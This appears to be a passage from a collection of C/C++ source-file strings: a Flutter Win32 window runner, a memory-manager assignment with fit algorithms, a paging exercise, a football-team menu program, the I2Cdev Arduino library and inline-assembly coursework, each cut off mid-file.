flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"MemoryManager.h\"\n\nint bestFit(int sizeInWords, void* list) {\n    uint16_t* holeList = (uint16_t*)list;\n    if (holeList == nullptr) {\n        return -1;\n    }\n\n    //iterates through each hole given in list and determines if it is large enough for sizeInWords and if it is the smallest hole\n    int offset = -1;\n    int size = INT_MAX;\n    int index = 2;\n    for (int i = 0; i < holeList[0]; i++) {\n        if (holeList[index] >= sizeInWords && holeList[index] <= size) {\n            size = holeList[index];\n            offset = holeList[index-1];\n        }\n        index += 2;\n    }\n    return offset;\n}\nint worstFit(int sizeInWords, void* list) {\n    uint16_t* holeList = (uint16_t*)list;\n    if (holeList == nullptr) {\n        return -1;\n    }\n\n    //iterates through each hole given in list and determines if it is large enough for sizeInWords and if it is the biggest hole\n    int offset = -1;\n    int size = 0;\n    int index = 2;\n    for (int i = 0; i < holeList[0]; i++) {\n        if (holeList[index] >= sizeInWords && holeList[index] >= size) {\n            size = holeList[index];\n            offset = holeList[index-1];\n        }\n        index += 2;\n    }\n    return offset;\n}\n\n\n\n//constructor\nMemoryManager::MemoryManager(unsigned wordSize, std::function<int(int, void*)> allocator) {\n    this->wordSize = wordSize;\n    this->allocator = allocator;\n}\n\n//destructor\nMemoryManager::~MemoryManager() {\n    shutdown();\n}\n\n//initialize the block of memory\nvoid MemoryManager::initialize(size_t sizeInWords) {\n    if (block != nullptr) {\n        shutdown();\n    }\n    if (initialized) {\n        shutdown();\n    }\n    //set the block size and create a new memory block and chunk of memory as a hole in the vector\n    if (sizeInWords < 65536) {\n        blockSize = wordSize * sizeInWords;\n        block = new char[blockSize];\n        Chunk chunk = Chunk(0, sizeInWords, true);\n        chunks.push_back(chunk);\n        initialized = true;\n    }\n}\n\n//dynamically deletes all memory allocated\nvoid MemoryManager::shutdown() {\n    if (initialized) {\n        delete[] block;\n        block = nullptr;\n        chunks.clear();\n        initialized = false;\n    } \n}\n\n//allocate memory on the block and determines holes\nvoid* MemoryManager::allocate(size_t sizeInBytes) {\n    //calculates size on the memory block to allocate\n    int wordsToAllocate;\n    if (sizeInBytes % getWordSize() != 0) {\n        wordsToAllocate = sizeInBytes/getWordSize() + 1;\n    } else {\n        wordsToAllocate = sizeInBytes/getWordSize();\n    }\n\n    uint16_t* holeList = (uint16_t*)getList();\n\n    //set the fit algorithm and find the offset of where to place the new chunk\n    int offset = allocator(wordsToAllocate, holeList);\n    delete[] holeList;\n    if (offset == -1) {\n        return nullptr;\n    }\n\n    Chunk chunk = Chunk(offset, wordsToAllocate, false);\n    \n    //finds the hole chunk in chunks vector\n    int index;\n    for (int i = 0; i < chunks.size(); i++) {\n        if (chunks[i].offset == chunk.offset) {\n            index = i;\n            break;\n        }\n    }\n    \n    //if the new chunk takes up the length of the hole (delete hole)\n    if (chunk.length == chunks[index].length) {\n        chunks.insert(chunks.begin()+index, chunk);\n        chunks.erase(chunks.begin() + (index+1));\n    } else {\n        //shorten hole\n        chunks[index].offset += chunk.length;\n        chunks[index].length -= chunk.length;\n        chunks.insert(chunks.begin()+index, chunk);\n    }\n\n    return block + (offset*getWordSize());\n}\n\n//frees the provided memory block and merges any holes\nvoid MemoryManager::free(void* address) {\n    int offset = ((char*)address - block)/getWordSize();\n\n    //finds the chunk at the offset\n    int index = -1;\n    for (int i = 0; i < chunks.size(); i++) {\n        if (!chunks[i].isHole && chunks[i].offset == offset) {\n            index = i;\n            break;\n        }\n    }\n\n    if (index == -1) {\n        return;\n    }\n    \n    chunks[index].isHole = true;\n\n    //if to the right is a hole merge    \n    if (index+1 < chunks.size() && chunks[index+1].isHole) {\n        chunks[index].length += chunks[index+1].length;\n        chunks.erase(chunks.begin() + index + 1);\n        chunks[index].isHole = true;\n    }\n    \n    //if to the left is a hole merge\n    if (index-1 >= 0 && chunks[index-1].isHole) {\n        chunks[index].offset = chunks[index-1].offset;\n        chunks[index].length += chunks[index-1].length;\n        chunks[index].isHole = true;\n        chunks.erase(chunks.begin()+index-1);\n    }\n\n}\n\nvoid MemoryManager::setAllocator(std::function<int(int, void*)> allocator) {\n    this->allocator = allocator;\n}\n\nint MemoryManager::dumpMemoryMap(char* filename) {\n    //open file descriptor\n    int fd = open(filename, O_CREAT | O_RDWR | O_TRUNC, 0777);\n    if (fd == -1) {\n        return -1;\n    }\n\n    //get list of holes and format the output string\n    uint16_t* holeList = (uint16_t*)getList();\n    string output;\n    int index = 1;\n    for (int i = 0; i < holeList[",
    "#include <iostream>\n#include <vector>\n#include <cstdlib>\n#include <ctime>\n#include <iomanip>\n\nusing namespace std;\n\nconst int PAGE_SIZE = 1024;\nconst int FRAME_SIZE = 1024;\nconst int NUM_PAGES = 64;\nconst int NUM_FRAMES = 8;\n\n\n\nvector<int> pageFrameTable(NUM_PAGES);\n\nint main() {\n    srand(time(nullptr));\n\n    vector<int> physicalMemory(NUM_FRAMES, -1);\n\n   \n    for (int i = 0; i < NUM_PAGES; ++i) {\n        pageFrameTable[i] = i % NUM_FRAMES;\n    }\n    int logicalAddress;\n    cout << \"Enter a logical address(ex: 0x5678): \";\n    cin >> hex >> logicalAddress; \n    //int logicalAddress = 0x5678;\n\n    int pageNumber = logicalAddress / PAGE_SIZE;\n    int offset = logicalAddress % PAGE_SIZE;\n\n    if (pageNumber < NUM_PAGES) {\n        int frameNumber = pageFrameTable[pageNumber];\n        int physicalAddress = frameNumber * FRAME_SIZE + offset;\n\n        cout << \"Logical Address: 0x\" << hex << setw(4) << setfill('0') << logicalAddress\n            << \" => Page Number: 0x\" << setw(2) << setfill('0') << pageNumber\n            << \", Offset: 0x\" << setw(2) << setfill('0') << (offset % 256) << endl;\n    }\n    else {\n        cout << \"Invalid Page Number: \" << pageNumber << endl;\n    }\n\n\n    return 0;\n}\n\n\n",
    "#include \"Team.h\"\n#include \"Coach.h\"\n#include \"Player.h\"\n#include \"FootballTeam.h\"\n#include <iostream>\n#include <string >\nusing namespace std;\nvoid getActivePlayersName(FootballTeam* F, char c = 'a')\n{\n\tPlayer* p = new Player[F->getCount()];\n\tp = F->retrievePlayers(c);\n\tfor (int i = 0; i < F->getCount(); i++)\n\t{\n\t\tif (p[i].getPlayerName() != \"\")\n\t\t{\n\t\t\tp[i].print();\n\t\t}//if\n\t}//for\n}//getActivePlayersName\nvoid printTeamInfo(Team* t)\n{\n\tt->print();\n\tcout << endl;\n}//team \n\n\nint main() {\n\t//1. Create a dynamic object of FootballTeam class with the following values: \"Manchester City\", \"Guardiola\", 32, 123, 50\n\tFootballTeam* manCity = new FootballTeam(\"Manchester City\", \"Guardiola\", 32, 123, 50);\n\t//2. Create a dynamic object of FootballTeam class with the following values: \"Barcelona\", \"Xavi\", 37, 21, 75\n\tFootballTeam* barcelona = new FootballTeam(\"Barcelona\", \"Xavi\", 37, 21, 75);\n\n\tmanCity->addPlayer(\"Riyad Mahrez\", 26, 'a');\n\tmanCity->addPlayer(\"Julian Alvarez\", 19, 'a');\n\tmanCity->addPlayer(\"Erling Haaland\", 9, 'a');\n\tmanCity->addPlayer(\"Bernardo Silva\", 20, 'i');\n\tmanCity->addPlayer(\"Jack Grealish\", 10, 'i');\n\tmanCity->addPlayer(\"Kevin De Bruyne\", 17, 'a');\n\tmanCity->addPlayer(\"Kyle Walker\", 2, 'i');\n\tbarcelona->addPlayer(\"Marcos Alonso\", 17, 'i');\n\tbarcelona->addPlayer(\"Jordi Alba\", 18, 'a');\n\tbarcelona->addPlayer(\"Eric Garc\u00eda\", 25, 'a');\n\tbarcelona->addPlayer(\"Sergio Busquets\", 5, 'i');\n\tbarcelona->addPlayer(\"Frenkie de Jong\", 21, 'a');\n\tbarcelona->addPlayer(\"Ousmane Demb\u00e9l\u00e9\", 7, 'a');\n\tbarcelona->addPlayer(\"Ansu Fati\", 10, 'a');\n\tbarcelona->addPlayer(\"Memphis Depay\", 14, 'a');\n\tint choice;\n\tdo {\n\n\t\tcout << \"***************************** Menu * ******************************\\n\";\n\t\tcout << \"Enter 1: to add a player.\\n\"\n\t\t\t<< \"Enter 2: to remove a player.\\n\"\n\t\t\t<< \"Enter 3: to update points.\\n\"\n\t\t\t<< \"Enter 4: to display teams points.\\n\"\n\t\t\t<< \"Enter 5: to print the team name that has more points.\\n\"\n\t\t\t<< \"Enter 6: to check whether the two teams have the same number of players.\\n\"\n\t\t\t<< \"Enter 7: to display team info (team name, coach and players).\\n\"\n\t\t\t<< \"Enter 8: to display active players.\\n\"\n\t\t\t<< \"Press any Key to EXIT.\\n\";\n\n\t\t\"********************************************************************\\n\";\n\t\tcin >> choice;\n\t\tswitch (choice) {\n\t\t\tint c;\n\t\t\t//*******************Add Player*******************\n\t\tcase 1:\n\t\t{\n\t\t\tcout << \"Enter 1 to add a player to Manchester City, or\\n\"\n\t\t\t\t<< \"Enter 2 to add a player to Barcelona.\\n\";\n\t\t\tint num;\n\t\t\tstring name;\n\t\t\tchar s;\n\t\t\tcin >> c;\n\t\t\tcout << \"Enter player name, number and status (a: active or i: inactive).\\n\";\n\t\t\tcin >> name >> num >> s;\n\t\t\tswitch (c) {\n\t\t\tcase 1:\n\t\t\t\t//3. Add the player to Man. City team.\n\t\t\t\tmanCity->addPlayer(name, num, s);\n\t\t\t\tcout << \"Added... \" << name << endl << endl;\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\t//4. Add the player to Barcelona team.\n\t\t\t\tbarcelona->addPlayer(name, num, s);\n\t\t\t\tcout << \"Added... \" << name << endl << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\t//*******************Remove Player*******************\n\t\tcase 2:\n\t\t{\n\t\t\tcout << \"Enter 1 to remove a player from Manchester City, or\\n\"\n\t\t\t\t<< \"Enter 2 to remove a player from Barcelona.\\n\";\n\t\t\tcin >> c;\n\t\t\tint num;\n\t\t\tcout << \"\\nEnter the player number you want to remove... \";\n\t\t\tcin >> num;\n\t\t\tswitch (c) {\n\t\t\tcase 1:\n\t\t\t\t//5. Print the player\u2019s name you want to remove from Man. City team then remove the player from the team.\n\t\t\t\tmanCity->removePlayer(num);\n\t\t\t\t//cout << \"removed\" << endl;\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\t//6. Print the player\u2019s name you want to remove from Barcelona team then remove the player from the team.\n\t\t\t\tbarcelona->removePlayer(num);\n\t\t\t\t//cout << \"removed\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\t//*******************Update Points*******************\n\t\tcase 3:\n\t\t{\n\t\t\tcout << \"Enter 1 to update the points for Manchester City, or\\n\"\n\t\t\t\t<< \"Enter 2 to update the points for Barcelona.\\n\";\n\t\t\tcin >> c;\n\t\t\tint p;\n\t\t\tcout << \"Enter the new point the Team has earned... \";\n\t\t\tcin >> p;\n\t\t\tif (c == 1) {\n\t\t\t\t//7. Update the points for Man. City team.\n\n\t\t\t\tmanCity->updatePoints(p);\n\t\t\t\tcout << \"Updated...\\n\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\t//8. Update the points for Barcelona team.\n\t\t\t\tbarcelona->updatePoints(p);\n\t\t\t\tcout << \"Updated...\\n\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\t//*******************Display Points*******************\n\t\tcase 4:\n\t\t{\n\t\t\t//9. Display the points for Man. City and Barcelona teams as in the sample output.\n\t\t\tcout << \"Points for: \" << endl;\n\t\t\tcout << \"Manchester City: \" << manCity->getNumberOfPoints() << endl;;\n\t\t\tcout << \"Barcelona: \" << barcelona->getNumberOfPoints() << endl;\n\t\t\tbreak;\n\t\t}\n\t\t//*******************More Points*******************\n\t\tcase 5:\n\t\t{\n\t\t\t//10. Display the team\u2019s name that has more points.\n\n\t\t\tcout << \"The team has more points is: \" << manCity->moreNumberOfPoints(barcelona).getTeamName() << endl;\n\n\t\t\tbreak;\n\t\t}\n\t\t//*******************Same #Players*******************\n\t\tcase 6:\n\t\t{\n\t\t\t//11. Check whether the two teams have the same number of players.\n\t\t\t//bar",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// I2Cdev library collection - Main I2C device class\n// Abstracts bit and byte I2C R/W functions into a convenient class\n// 6/9/2012 by Jeff Rowberg <jeff@rowberg.net>\n//\n// Changelog:\n//      2013-05-06 - add Francesco Ferrara's Fastwire v0.24 implementation with small modifications\n//      2013-05-05 - fix issue with writing bit values to words (Sasquatch/Farzanegan)\n//      2012-06-09 - fix major issue with reading > 32 bytes at a time with Arduino Wire\n//                 - add compiler warnings when using outdated or IDE or limited I2Cdev implementation\n//      2011-11-01 - fix write*Bits mask calculation (thanks sasquatch @ Arduino forums)\n//      2011-10-03 - added automatic Arduino version detection for ease of use\n//      2011-10-02 - added Gene Knight's NBWire TwoWire class implementation with small modifications\n//      2011-08-31 - added support for Arduino 1.0 Wire library (methods are different from 0.x)\n//      2011-08-03 - added optional timeout parameter to read* methods to easily change from default\n//      2011-08-02 - added support for 16-bit registers\n//                 - fixed incorrect Doxygen comments on some methods\n//                 - added timeout value for read operations (thanks mem @ Arduino forums)\n//      2011-07-30 - changed read/write function structures to return success or byte counts\n//                 - made all methods static for multi-device memory savings\n//      2011-07-28 - initial release\n\n/* ============================================\nI2Cdev device library code is placed under the MIT license\nCopyright (c) 2013 Jeff Rowberg\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n===============================================\n*/\n\n#include \"./I2Cdev.h\"\n\n#if I2CDEV_IMPLEMENTATION == I2CDEV_ARDUINO_WIRE\n\n    #ifdef I2CDEV_IMPLEMENTATION_WARNINGS\n        #if ARDUINO < 100\n            #warning Using outdated Arduino IDE with Wire library is functionally limiting.\n            #warning Arduino IDE v1.0.1+ with I2Cdev Fastwire implementation is recommended.\n            #warning This I2Cdev implementation does not support:\n            #warning - Repeated starts conditions\n            #warning - Timeout detection (some Wire requests block forever)\n        #elif ARDUINO == 100\n            #warning Using outdated Arduino IDE with Wire library is functionally limiting.\n            #warning Arduino IDE v1.0.1+ with I2Cdev Fastwire implementation is recommended.\n            #warning This I2Cdev implementation does not support:\n            #warning - Repeated starts conditions\n            #warning - Timeout detection (some Wire requests block forever)\n        #elif ARDUINO > 100\n            #warning Using current Arduino IDE with Wire library is functionally limiting.\n            #warning Arduino IDE v1.0.1+ with I2CDEV_BUILTIN_FASTWIRE implementation is recommended.\n            #warning This I2Cdev implementation does not support:\n            #warning - Timeout detection (some Wire requests block forever)\n        #endif\n    #endif\n\n#elif I2CDEV_IMPLEMENTATION == I2CDEV_BUILTIN_FASTWIRE\n\n    //#error The I2CDEV_BUILTIN_FASTWIRE implementation is known to be broken right now. Patience, Iago!\n\n#elif I2CDEV_IMPLEMENTATION == I2CDEV_BUILTIN_NBWIRE\n\n    #ifdef I2CDEV_IMPLEMENTATION_WARNINGS\n        #warning Using I2CDEV_BUILTIN_NBWIRE implementation may adversely affect interrupt detection.\n        #warning This I2Cdev implementation does not support:\n        #warning - Repeated starts conditions\n    #endif\n\n    // NBWire implementation based heavily on code by Gene Knight <Gene@Telobot.com>\n    // Originally posted on the Arduino forum at http://arduino.cc/forum/index.php/topic,70705.0.html\n    // Originally offered to the i2cdevlib project at http://arduino.cc/forum/index.php/topic,68210.30.html\n    TwoWire Wire;\n\n#endif\n\n/** Default constructor.\n */\nI2Cdev::I2Cdev() {\n}\n\n/** Read a single bit from an 8-bit device register.\n * @param devAddr I2C slave device address\n * @param regAddr Register regAddr to read from\n * @param bitNum B",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff#include \"stdio.h\"\n#pragma warning(disable:4996)\n#include <iostream>\n#include <windows.h>\n#include <time.h>\n#include <conio.h>\n\n\nint uloha_2_1_1() {\n    int result = 0;\n    __asm\n    {\n        MOV eax, 2\n        MOV ebx, 3\n        ADD eax, ebx\n        MOV result, eax\n    }\n    printf(\"%d\\n\", result);\n}\n\nint uloha_2_1_2(int cislo) {\n    int result = 0;\n    __asm\n    {\n        MOV eax, cislo\n        SHL eax, 1\n        MOV result, eax\n    }\n    printf(\"%d\\n\", result);\n}\n\nint uloha_2_1_3(int cislo) {\n    int result = 0;\n    __asm\n    {\n        MOV eax, cislo\n        CMP eax, 9\n        JG point\n        ADD eax, '0'\n        JMP END\n        point :\n        ADD eax, 55\n            JMP END\n            END :\n        MOV result, eax;\n    }\n    printf(\"cislo in hexadecimal = %c\\n\", result);\n}\n\nvoid uloha_2_1_4(unsigned int* a, unsigned int* b, unsigned int* c, unsigned int* d) {\n    __asm\n    {\n        mov eax, 0    // Set up the function code\n        cpuid            // Execute CPUID instruction\n        mov edi, a       // Move the address of a into edi\n        mov[edi], eax   // Store the result of CPUID into a\n        mov edi, b       // Move the address of d into edi\n        mov[edi], ebx   // Store the result of CPUID into d\n        mov edi, c       // Move the address of a into edi\n        mov[edi], ecx   // Store the result of CPUID into a\n        mov edi, d       // Move the address of d into edi\n        mov[edi], edx   // Store the result of CPUID into d\n    }\n}\n\nint uloha_2_2() {\n    char string[] = \"architektura_pocitacov_je_super_predmet\";\n    int strlength = sizeof(string) / sizeof(char);\n    for (int i = 0; i < strlength; i++) {\n        printf(\"%c\", string[i]);\n    }\n    char* pointerstr = string;\n    printf(\"\\n%p\\n\", pointerstr);\n    pointerstr += 1;\n    *pointerstr = *\"A\";\n    for (int i = 0; i < strlength; i++) {\n        printf(\"%c\", string[i]);\n    }\n    pointerstr += 1000000;\n//    *pointerstr = *\"A\";\n    //for (int i = 0; i < strlength; i++) {\n    //    printf(\"%c \", string[i]);\n    //}\n\n\n    int pole[] = { 1, 2, 3, 4, 5 };\n    int length = sizeof(pole) / sizeof(int);\n    printf(\"\\n\");\n    for (int i = 0; i < length; i++) {\n        printf(\"%d \", pole[i]);\n    }\n    int* pointer = pole;\n    printf(\"\\n%p\\n\", pointer);\n    pointer += 1;\n    *pointer = 10;\n    for (int i = 0; i < length; i++) {\n        printf(\"%d \", pole[i]);\n    }\n    return 0;\n}\n\nint uloha_2_3_1() {\n    FILE* fr;\n    FILE* fw;\n    fr = fopen(\"poviedka.html\", \"r\");\n    char ch;\n    if (!fr) {\n        printf(\"not\");\n    }\n    else {\n        while ((ch = fgetc(fr)) != EOF) {\n            int char2 = ch;\n            if (char2 == 165) char2 = 188;\n            else if (char2 == 165) char2 = 188;\n            else if (char2 == 169) char2 = 138;\n            else if (char2 == 171) char2 = 141;\n            else if (char2 == 174) char2 = 142;\n            else if (char2 == 181) char2 = 190;\n            else if (char2 == 185) char2 = 154;\n            else if (char2 == 187) char2 = 157;\n            else if (char2 == 190) char2 = 158;\n            printf(\"%c\", char2);\n        }\n    }\n    return 0;\n}\n\nint uloha_2_5_1_pomocny() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    for (int k = 0; k <= 255; k++) {\n        SetConsoleTextAttribute(hConsole, k);\n        printf(\"color\\n\");\n    }\n    return 